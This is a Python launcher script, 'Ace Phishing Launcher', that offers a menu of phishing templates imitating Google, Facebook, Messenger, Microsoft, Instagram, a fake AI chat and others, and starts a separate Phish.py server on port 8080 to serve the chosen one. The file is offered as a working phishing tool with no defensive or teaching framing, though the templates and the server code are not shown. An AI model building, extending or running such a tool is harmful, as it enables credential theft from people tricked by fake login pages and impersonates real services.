#!/usr/bin/env python3
"""
Ace Phishing Launcher — menu-driven template picker
Pick a number, the template serves. That's it.
"""

import os
import sys
import subprocess

# ---- Templates ----
TEMPLATES = [
    ("Google",              "google"),
    ("Facebook",            "facebook"),
    ("Messenger",           "messenger"),
    ("Viral Video",         "viral"),
    ("FreeAI Chat",         "aichat"),
    ("Microsoft",           "microsoft"),
    ("Instagram",           "instagram"),
    ("Generic",             "generic"),
]

PORT = 8080


def clear():
    os.system("clear" if os.name != "nt" else "cls")


def banner():
    print(r"""
    ___                 ___ _    _    _         _   _
   / _ \               | _ \ |_ | |_ | |_  ___ | |_| |_  ___
  / /_\ \  ___ ___ ___ |  _/ ' \|  _|| ' \/ -_)|  _| ' \/ -_)
  \____/  |___|___|___||_| |_||_|\__||_||_\___| \__|_||_\___|
""")
    print("  Ace Phishing Launcher\n")
    print("  made by  ←→  Ace\n")


def show_menu():
    clear()
    banner()
    print("  Select a template:\n")
    for i, (name, _) in enumerate(TEMPLATES, 1):
        print(f"  [{i:>2}]  {name}")
    print("\n  [ 0]  Exit\n")


def get_choice():
    try:
        return input("  Your choice >> ").strip()
    except (EOFError, KeyboardInterrupt):
        return "0"


def check_templates():
    missing = []
    for name, key in TEMPLATES:
        path = os.path.join("templates", key)
        if not os.path.isdir(path):
            missing.append((name, path))
    return missing


def main():
    if not os.path.exists("Phish.py"):
        print("[!] Run this from the folder that contains Phish.py (cd ~/Huh)")
        sys.exit(1)

    missing = check_templates()
    if missing:
        print("[!] Some templates are missing:\n")
        for name, path in missing:
            print(f"    - {name}: {path}")
        print()
        input("Press Enter to continue anyway...")

    while True:
        show_menu()
        choice = get_choice()

        if choice in ("0", "q", "exit"):
            print("  Bye.")
            break

        if not choice.isdigit():
            print("  [!] Enter a number.")
            input("  Enter to continue...")
            continue

        idx = int(choice) - 1
        if idx < 0 or idx >= len(TEMPLATES):
            print("  [!] Number out of range.")
            input("  Enter to continue...")
            continue

        name, key = TEMPLATES[idx]

        if not os.path.isdir(os.path.join("templates", key)):
            print(f"  [!] Template folder missing: templates/{key}")
            print(f"      Create it, or pick another option.")
            input("  Enter to continue...")
            continue

        print(f"\n  [*] Launching '{name}' on port {PORT}")
        print(f"  [*] Ctrl+C to stop and return to menu.\n")

        try:
            subprocess.run(
                ["python3", "Phish.py", "-t", key, "-p", str(PORT)],
                check=False,
            )
        except KeyboardInterrupt:
            print("\n  [*] Stopped.")
        except FileNotFoundError:
            print("  [!] python3 not found.")
            sys.exit(1)

        input("\n  Server stopped. Press Enter to return to menu...")


if __name__ == "__main__":
    main()
